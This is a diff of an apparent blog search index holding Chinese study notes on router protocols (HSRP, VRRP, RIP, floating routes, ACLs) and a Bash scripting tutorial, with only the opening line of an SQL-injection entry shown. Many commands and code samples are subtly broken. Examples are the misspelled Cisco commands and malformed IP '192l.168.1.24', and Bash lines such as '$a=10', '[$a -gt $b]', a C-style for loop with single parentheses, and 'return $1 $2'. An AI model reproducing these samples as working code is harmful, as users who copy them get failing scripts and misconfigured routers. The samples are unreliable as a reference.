-<p>(config)#router rip<br>(config)#acc 1 deny any<br>(config-router)# network 接口网段<br>(config-router)# network 接口网段<br>(config-router)# passive-interface f0&#x2F;1 &#x2F;&#x2F;配置被动接口，只收不发<br>(config-router)# discribute-list 1 in f0&#x2F;1 &#x2F;&#x2F;配置路由过滤<br>(config-router)# distance 50 &#x2F;&#x2F;配置管理距离值，该值越小路由信息越可靠<br>(config-router)# neigbor 192l.168.1.24 &#x2F;&#x2F;配置邻居路由，以单播的形式发送路由信息</p>
-<h1 id="配置浮动路由"><a href="#配置浮动路由" class="headerlink" title="配置浮动路由"></a>配置浮动路由</h1><p>ip route 网段 掩码 下一跳地址|端口号 70<br>ip route 网段 掩码 下一跳地址|端口号 100 &#x2F;&#x2F;最后一个参数位管理距离，其值越大表示优先级越低</p>
-<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>配置acl首先要配置内外网端口，配置过滤规则，将规则应用到端口。最后有一条默认拒绝所有。deny any</p>
-<p>ACL包括标准acl 与扩展acl</p>
-<p>标准acl是机与源ip地址进行过滤的 工作在三成 表号1-99</p>
-<p>扩展acl可以通过端口号、协议等进行匹配过滤 国祚在三层与四层 表号 100-199</p>
-<p>一个接口的一个方向只能有一张acl表，数据包一旦被某个rule匹配，就不再向下进行匹配。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>协议规范</category>
-      </categories>
-      <tags>
-        <tag>HRSP</tag>
-        <tag>RIP</tag>
-        <tag>ACL</tag>
-        <tag>IPSec</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTTP-HTTPS协议</title>
     <url>/archives/ac8f02b1.html</url>
     <content><![CDATA[<h1 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h1><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="HTTP概述"><a href="#HTTP概述" class="headerlink" title="HTTP概述"></a>HTTP概述</h2><p>http-超文本标记语言，属于七层应用层协议，默认端口号80，基于tcp的协议。</p>
@@ -3407,6 +3373,45 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       <tags>
         <tag>HTTP</tag>
         <tag>HTTPS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HRSP-浮动路由-RIP-ACL-IPsec</title>
+    <url>/archives/db738475.html</url>
+    <content><![CDATA[<h1 id="配置HSRP"><a href="#配置HSRP" class="headerlink" title="配置HSRP"></a>配置HSRP</h1><p>R1(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R1(config-if)#standby 1 ip 虚拟ip地址<br>R1(config-if)#standby 1 priority 100<br>R1(config-if)# standby 1 preempt  &#x2F;&#x2F;配置占先权<br>R1(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间 同一hsrp组的时间应一致<br>R1(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R1(config)# spanning-tree vlan 10 root primary<br>R1(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>R2(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R2(config-if)#standby 1 ip 虚拟ip地址<br>R2(config-if)#standby 1 priority 195 &#x2F;&#x2F;0-255<br>R2(config-if)# standby 1 preempt &#x2F;&#x2F;设置活跃路由器得占先权，由于从较低优先级别得路由器中取回转发全，回复活跃路由器的角色<br>R2(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间<br>R2(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R2(config)# spanning-tree vlan 10 root primary<br>R2(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>优先级高的路由其作为主路由，优先级低的路由作为备份路由，当主路由发生故障的时候，备份路由由监听状态切换到活跃状态。当优先级相同时，比较端口ip,ip较大的作为活跃路由，如果优先级低的路由<br>已经成为了活跃路由，那么优先级高的路由将作为监听路由，直到活跃路由发生故障。值愈大优先级越高</p>
+<h2 id="hsrp协议组中由6种状态："><a href="#hsrp协议组中由6种状态：" class="headerlink" title="hsrp协议组中由6种状态："></a>hsrp协议组中由6种状态：</h2><p>初始状态：路由器刚启动时，或者配置发生改变时<br>学习状态：路由其等待来自活跃路由器的消息，此时路由器还没有收到来自活跃里尤其的hello消息，也没有学习到虚拟路由器的ip地址<br>监听状态：路由其学习了虚拟的ip地址，但他既不是活跃路由器也不是监听路由器，此时负责监听来自活跃路由器与备份路由器的hello包<br>发言状态：路由器周期性发送hello消息，并参与活跃路由器或者备份路由器的京选<br>备份状态：处于该状态的路由器时下一个活跃路由器的候选设备，其周期性得发送hello包<br>活跃状态：负责转发虚拟路由器得数据包，并周期性得发送hello消息。<br>hello间隔：3s<br>保持间隔10s<br>通产保持间隔要在hello间隔得3倍<br>使用udp协议</p>
+<h2 id="vrrp-虚拟路由冗余协议"><a href="#vrrp-虚拟路由冗余协议" class="headerlink" title="vrrp 虚拟路由冗余协议"></a>vrrp 虚拟路由冗余协议</h2><p>只有初始状态、活跃状态、备份状态三种状态<br>允许vrrp组得设备间建立认证机制</p>
+<h1 id="rip-距离矢量算法，根据跳数来选择路由"><a href="#rip-距离矢量算法，根据跳数来选择路由" class="headerlink" title="rip-距离矢量算法，根据跳数来选择路由"></a>rip-距离矢量算法，根据跳数来选择路由</h1><p>属于内部网关协议igp-有一系列协议族  还有一种时外部网关协议egp-只有一种协议<br>内部网关协议是往往是工作在一个组织实体里面的的路由器之间交换路由信息的协议，组织实体是指像学校、医院之类的实体<br>最大路由跳数为15跳，大于该值的路由被认为不可达</p>
+<p>当更新周期到达时，其向相邻的路由器发送学习到的路由。</p>
+<p>通过更行-update 与请求-requests两种分组来传输信息，更新周期为30s，如果不进行指定默认通过广播的形式更新信息。更新信息包括路由表与跳数两个部分。其并不是绝对根据跳数来选择路由的，同时也会参考网络的带宽。因为rip协议通过相邻路由器来更新路由表所以多网络全局的状况不清除，从而导致了一个慢收敛与不一致的问题。当三个火更多路由器构成环路是路由环路的问题仍会发生，这是需要用到触发更新法</p>
+<p>RIP的水平分割</p>
+<p>既路由器不向路径到来的方向回传此路径。通过将这些路由的跳数设置为16来实现该功能，能及时的解决路由环路的问题</p>
+<p>RIP的保持定时器法</p>
+<p>保持定时器可以防止路由器在路径从路由器从路由表中删除一定时间内（通常为180秒）接受新的路由信息。目的是为了保证每个路由器都收到路由不可达的信息，从而有效得避免了路由环路得产生。</p>
+<p>RIP的触发更新法</p>
+<p>当某个路径的跳数改变了路由器立即发生更新信息，不管路由器是否到达常规信息更新时间都发出更新信息。能够有效得加快路由的收敛时间</p>
+<p>收敛机制</p>
+<p><img src="/archives/db738475/QQ20210329085323.png"></p>
+<p>当主机与其直连路由器的链路发生中断时，其立刻向于其相邻的两个路由器发送路由更新信息，如果此时发送到右下路由器的信息发生堵塞延迟，则右上方的路由器先得到更新信息，将旧的到达主机的路由信息丢弃，右下方路由器因为没有收到来自左上路由器的更新信息，继续向右上路由器发送旧的路由信息，右上方路由器收到后又添加一条到达主机的路由。如此循环形成了路由环路。<br>使用udp协议的520端口</p>
+<p>RIP帧格式</p>
+<p><a href="RIP%E5%B8%A7%E6%A0%BC%E5%BC%8F%202019e93eb947495cbb98e4df2efa90c1.csv">RIP帧格式</a></p>
+<p>(config)#router rip<br>(config)#acc 1 deny any<br>(config-router)# network 接口网段<br>(config-router)# network 接口网段<br>(config-router)# passive-interface f0&#x2F;1 &#x2F;&#x2F;配置被动接口，只收不发<br>(config-router)# discribute-list 1 in f0&#x2F;1 &#x2F;&#x2F;配置路由过滤<br>(config-router)# distance 50 &#x2F;&#x2F;配置管理距离值，该值越小路由信息越可靠<br>(config-router)# neigbor 192l.168.1.24 &#x2F;&#x2F;配置邻居路由，以单播的形式发送路由信息</p>
+<h1 id="配置浮动路由"><a href="#配置浮动路由" class="headerlink" title="配置浮动路由"></a>配置浮动路由</h1><p>ip route 网段 掩码 下一跳地址|端口号 70<br>ip route 网段 掩码 下一跳地址|端口号 100 &#x2F;&#x2F;最后一个参数位管理距离，其值越大表示优先级越低</p>
+<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>配置acl首先要配置内外网端口，配置过滤规则，将规则应用到端口。最后有一条默认拒绝所有。deny any</p>
+<p>ACL包括标准acl 与扩展acl</p>
+<p>标准acl是机与源ip地址进行过滤的 工作在三成 表号1-99</p>
+<p>扩展acl可以通过端口号、协议等进行匹配过滤 国祚在三层与四层 表号 100-199</p>
+<p>一个接口的一个方向只能有一张acl表，数据包一旦被某个rule匹配，就不再向下进行匹配。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>协议规范</category>
+      </categories>
+      <tags>
+        <tag>HRSP</tag>
+        <tag>RIP</tag>
+        <tag>ACL</tag>
+        <tag>IPSec</tag>
       </tags>
   </entry>
   <entry>
@@ -3769,79 +3774,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>Shell编程</title>
-    <url>/archives/6309c3f8.html</url>
-    <content><![CDATA[<h1 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h1><h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>使用普通的文本编辑器即可编写,这里创建一个a.sh的shell脚本</p>
-<p>开头第一行为 ： #! &#x2F;bin&#x2F;bash &#x2F;&#x2F;目录表示shell类型</p>
-<p>执行方法： cd到文件所在目录，.&#x2F;a.sh &#x2F;&#x2F;注意不可直接写a.sh，如果这样写系统会到环境变量的path项中添加的目录中去寻找该文件执行，因为往往我们的shell脚本并没有在这些目录里面则系统无法找到该文件。</p>
-<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure>
-
-<p>等号两端不能有空格</p>
-<h2 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>{}用于定义变量边界</p>
-<h2 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> var</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!</span></span><br><span class="line"><span class="string">var=&quot;</span>hejixiong<span class="string">&quot;  #修改只读变量会报错</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">unset</span> var</span><br></pre></td></tr></table></figure>
-
-<p>不能删除只读变量</p>
-<h2 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h2><p>**局部变量：**shell脚本中定义的变量，只能在脚本中使用</p>
-<p>**环境变量：**所有的程序，包括shell启动的程序都可以访问环境变量</p>
-<p>**shell变量：**由shell程序设置的特殊变量，有一部分是环境变量有一部分是局部变量</p>
-<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>可以使用单引号也可以使用双引号</p>
-<p>单引号中的内容原样输出</p>
-<p>双引号中的内容可以包含变量，</p>
-<p>\ 为转义标志</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nihao&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao \&quot;<span class="variable">$&#123;var&#125;</span>\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#var&#125;</span> <span class="comment">#输出8</span></span><br></pre></td></tr></table></figure>
-
-<p>提取子字符串</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;var:1:3&#125;</span> <span class="comment"># 输出rma</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>通过下标访问，下标的开始值为0，只有一维数组，且无大小限制</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array1=(1 2 3 45 56 43)</span><br><span class="line">array2=(</span><br><span class="line">1 </span><br><span class="line">2 </span><br><span class="line">3 </span><br><span class="line">45 </span><br><span class="line">56 </span><br><span class="line">43</span><br><span class="line">)</span><br><span class="line"><span class="built_in">declare</span> -A array4 <span class="comment">#声明数组</span></span><br><span class="line">array3[0]=1</span><br><span class="line">array3[1]=134</span><br><span class="line">array3[2]=145</span><br><span class="line">array4[234]=44</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[0]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[@]&#125;</span> <span class="comment">#获取数组中所有元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>获取数组长度</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array=(1 2 3 45 56 43)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[@]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[*]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[n]&#125;</span> <span class="comment">#获取数组中某个元素的长度</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>多行注释</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
-
-<p>参数传递</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 文件名a.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;脚本名为<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为<span class="variable">$3</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>chmod +x a.sh</p>
-<p>.&#x2F;a.sh 12 “hjx” ‘red’</p>
-<p><a href="Untitled%20521b7c9be779487aaeb0ad68a1ad16fa.csv">Untitled</a></p>
-<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=10</span><br><span class="line"><span class="variable">$b</span>=12</span><br><span class="line"><span class="keyword">if</span> [<span class="variable">$a</span> -gt <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> + <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="variable">$a</span> -eq <span class="variable">$b</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> - <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> \* <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">ls</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> (i=1;i&lt;10;i++);<span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$int</span>&lt;=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$int</span></span><br><span class="line">	<span class="built_in">let</span> <span class="string">&quot;int++&quot;</span> <span class="comment">#使用let命令，在变量计算中就不需要加上$</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="until"><a href="#until" class="headerlink" title="until"></a>until</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line"><span class="keyword">until</span> [! <span class="variable">$a</span> -lt 10]</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">	a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
-<p>当条件不成立的时候执行代码块</p>
-<p>当条件成立时跳出循环，与while正好相反</p>
-<h2 id="case-…-esac"><a href="#case-…-esac" class="headerlink" title="case … esac"></a>case … esac</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> num</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$num</span> <span class="keyword">in</span></span><br><span class="line">	1) <span class="built_in">echo</span> <span class="string">&#x27;你选择了1&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	2) <span class="built_in">echo</span> <span class="string">&#x27;你选择了2&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	*) <span class="built_in">echo</span> <span class="string">&#x27;请正常输入&#x27;</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;这是一个函数&#x27;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">	<span class="built_in">return</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">test</span> 1 2</span><br><span class="line">func=<span class="keyword">function</span>&#123;</span><br><span class="line">	<span class="comment">#body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h1><p><a href="Untitled%20569327758ca8421ebe2a12f906547f30.csv">Untitled</a></p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>. filename</p>
-<p>source filename</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>编程语言</category>
-      </categories>
-      <tags>
-        <tag>Shell编程</tag>
-        <tag>Shell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入</title>
     <url>/archives/e73517db.html</url>
     <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h1 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h1><h2 id="数字注入"><a href="#数字注入" class="headerlink" title="数字注入"></a>数字注入</h2><p><strong>查询语句</strong>：select * from table where id&#x3D;1</p>
@@ -4098,6 +4030,79 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>Shell编程</title>
+    <url>/archives/6309c3f8.html</url>
+    <content><![CDATA[<h1 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h1><h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>使用普通的文本编辑器即可编写,这里创建一个a.sh的shell脚本</p>
+<p>开头第一行为 ： #! &#x2F;bin&#x2F;bash &#x2F;&#x2F;目录表示shell类型</p>
+<p>执行方法： cd到文件所在目录，.&#x2F;a.sh &#x2F;&#x2F;注意不可直接写a.sh，如果这样写系统会到环境变量的path项中添加的目录中去寻找该文件执行，因为往往我们的shell脚本并没有在这些目录里面则系统无法找到该文件。</p>
+<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure>
+
+<p>等号两端不能有空格</p>
+<h2 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>{}用于定义变量边界</p>
+<h2 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> var</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!</span></span><br><span class="line"><span class="string">var=&quot;</span>hejixiong<span class="string">&quot;  #修改只读变量会报错</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">unset</span> var</span><br></pre></td></tr></table></figure>
+
+<p>不能删除只读变量</p>
+<h2 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h2><p>**局部变量：**shell脚本中定义的变量，只能在脚本中使用</p>
+<p>**环境变量：**所有的程序，包括shell启动的程序都可以访问环境变量</p>
+<p>**shell变量：**由shell程序设置的特殊变量，有一部分是环境变量有一部分是局部变量</p>
+<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>可以使用单引号也可以使用双引号</p>
+<p>单引号中的内容原样输出</p>
+<p>双引号中的内容可以包含变量，</p>
+<p>\ 为转义标志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nihao&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao \&quot;<span class="variable">$&#123;var&#125;</span>\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#var&#125;</span> <span class="comment">#输出8</span></span><br></pre></td></tr></table></figure>
+
+<p>提取子字符串</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;var:1:3&#125;</span> <span class="comment"># 输出rma</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>通过下标访问，下标的开始值为0，只有一维数组，且无大小限制</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array1=(1 2 3 45 56 43)</span><br><span class="line">array2=(</span><br><span class="line">1 </span><br><span class="line">2 </span><br><span class="line">3 </span><br><span class="line">45 </span><br><span class="line">56 </span><br><span class="line">43</span><br><span class="line">)</span><br><span class="line"><span class="built_in">declare</span> -A array4 <span class="comment">#声明数组</span></span><br><span class="line">array3[0]=1</span><br><span class="line">array3[1]=134</span><br><span class="line">array3[2]=145</span><br><span class="line">array4[234]=44</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[0]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[@]&#125;</span> <span class="comment">#获取数组中所有元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取数组长度</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array=(1 2 3 45 56 43)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[@]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[*]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[n]&#125;</span> <span class="comment">#获取数组中某个元素的长度</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>多行注释</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
+
+<p>参数传递</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 文件名a.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;脚本名为<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为<span class="variable">$3</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>chmod +x a.sh</p>
+<p>.&#x2F;a.sh 12 “hjx” ‘red’</p>
+<p><a href="Untitled%20521b7c9be779487aaeb0ad68a1ad16fa.csv">Untitled</a></p>
+<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=10</span><br><span class="line"><span class="variable">$b</span>=12</span><br><span class="line"><span class="keyword">if</span> [<span class="variable">$a</span> -gt <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> + <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="variable">$a</span> -eq <span class="variable">$b</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> - <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> \* <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
